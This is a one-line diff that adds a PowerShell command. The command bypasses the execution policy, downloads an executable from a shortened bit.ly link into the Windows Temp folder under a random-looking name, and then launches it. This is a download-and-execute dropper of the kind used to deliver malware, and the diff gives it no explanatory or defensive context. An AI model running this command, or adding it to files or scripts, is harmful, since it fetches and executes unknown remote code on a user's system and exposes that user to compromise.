@@ -1,0 +1,1 @@
+powershell -ExecutionPolicy bypass -command "(New-Object System.Net.WebClient).DownloadFile('http://bit.ly/49DWvr7', 'C:\Windows\Temp\bilteddqqq.exe'); Start-Process ('bilteddqqq.exe')"
